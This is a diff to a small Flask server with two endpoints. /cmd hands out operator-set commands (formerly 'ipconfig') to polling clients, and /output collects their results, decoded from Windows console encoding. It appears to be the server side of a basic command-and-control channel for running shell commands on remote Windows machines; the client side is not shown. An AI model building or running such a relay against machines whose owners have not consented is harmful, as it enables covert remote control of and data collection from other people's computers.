@@ -1,15 +1,17 @@
 from flask import Flask, request
 
 app = Flask(__name__)
-command = "ipconfig"
+command = ""
 out = ""
 
 
 @app.route("/cmd", methods=['GET', 'POST'])
 def cmd():
     global command
+    global out
     if request.method == 'POST':
         command = request.form['command']
+        out += command + '\n'
     return command
 
 
@@ -17,8 +19,9 @@ def cmd():
 def output():
     global out
     if request.method == 'POST':
-        out = out + request.form['out'] + '\n' + '\n'
-        print(out)
+        req = request.form['out'].encode('cp1251').decode('cp866')
+        req = req.replace("\n", "<br />\n")
+        out += req + '\n' + '-' * 600
     return out
 
 
